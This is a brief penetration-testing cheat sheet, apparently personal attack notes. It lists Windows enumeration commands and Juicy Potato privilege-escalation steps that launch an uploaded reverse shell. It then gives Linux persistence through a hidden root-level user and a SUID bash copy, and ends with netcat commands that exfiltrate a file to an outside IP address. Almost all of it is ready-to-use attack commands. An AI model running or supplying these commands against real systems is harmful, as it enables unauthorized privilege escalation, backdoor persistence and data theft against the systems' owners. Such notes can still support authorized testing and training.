# Windows



```
whoami /priv
```

```
net user
```

```
systeminfo
```

```
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
```

```
dir c:\
```

```
dir "c:\program files"
```

```
dir "c:\program files (x86)"
```

```
wmic service get name,startname
```

```
wmic service get name,pathname,startname | findstr "Program Files"
```

```
cacls *.exe
```

**Juicy Potato**

* Download Juicy Potato to your attack machine
* Upload Juicy Potato to the target (ex: via FTP, SMB, HTTP, etc.)
* Create a reverse shell and upload it to the target (ex: via FTP, SMB, HTTP, etc.) use Juicy Potato to execute your reverse shell

```
wget https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe
```

```
JuicyPotato.exe -l 5050 -p C:\path\to\reverse-shell.exe -t *
```

**Persistence**

Add a new user.

```
useradd -p $(openssl passwd -crypt password) -s /bin/bash -o -u 0 -g 0 -m victor
```

Rootbash (Credit: Tib3rius).

```
# as root, create a copy of BASH and then set the SUID-bit
# to resume root-access execute the new binary using -p
cp /bin/bash /tmp/bash; chown root /tmp/bash; chmod u+s /tmp/bash; chmod o+x /tmp/bash
/tmp/bash -p
```

Exfil via Netcat.

```
nc -nvlp 5050 > stolen.exe
nc.exe -w3 10.11.12.13 5050 < stealme.exe
```
